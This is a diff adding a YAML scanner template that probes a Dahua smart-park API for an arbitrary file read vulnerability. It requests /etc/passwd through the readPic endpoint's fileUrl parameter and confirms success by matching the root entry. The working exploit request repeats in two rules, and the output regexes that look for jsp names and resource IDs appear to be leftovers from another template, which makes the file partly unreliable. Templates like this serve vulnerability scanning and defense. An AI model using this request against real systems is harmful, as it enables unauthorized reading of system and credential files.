@@ -1,0 +1,64 @@
+name: dahua-wulian-readPic-file-read
+detail:
+  author: 
+  links:
+    - 
+  vulnerability:
+    level: critical
+    fofa-query: 
+    hunter-query: 
+    quake-query: 
+    zoomeye-query: 
+    threatbook-query: 
+    cve: 
+    tips: 
+
+transport: http
+set:
+    s1: randomInt(1000000000, 9000000000)
+    s2: randomLowercase(8)
+    s3: randomLowercase(8)
+    rboundary: randomInt(800000000, 1000000000)
+    reverse: newReverse()  # 结果表达式写 reverse.wait(5)
+    reverseURL: reverse.url # http://xxx
+    reverseRMI: reverse.rmi # rmi://xx 
+    requestURL: request.url # 目标url http://xx
+    # reverseDM: reverse.domain  反连域名,必须配好域名才能使用，不然会报错
+    t1: timeConvert(now(), '2006-01-02')
+    t2: timeConvert(now(), '2006-01')
+    b1: base64Decode("")
+    h1: hexDecode("")
+    # m5: md5(string(requestURL))) m5 不调用的话，就会报错运行不起来
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /evo-apigw/evo-cirs/file/readPic?fileUrl=file:/etc/passwd
+      follow_redirects: false
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+        Accept-Encoding: gzip
+      body:
+      
+    expression: response.status == 200 && "root:[x*]:0:0:".matches(response.body_string)
+
+    output:
+      search: '"(?P<re_file>\\w+.jsp)".bsubmatch(response.body)'
+      re_file: search["re_file"]          
+      search1: '"resourceUuid\":\"(?P<re_dir>.+?)\",\"resourceType".bsubmatch(response.body)' 
+      re_dir: search1["re_dir"]            
+
+  r1:
+    request:
+      method: GET
+      path: /evo-apigw/evo-cirs/file/readPic?fileUrl=file:/etc/passwd
+      follow_redirects: false
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+        Accept-Encoding: gzip
+      body:
+
+    expression: response.status == 200 && "root:[x*]:0:0:".matches(response.body_string)
+    
+expression: r0() 
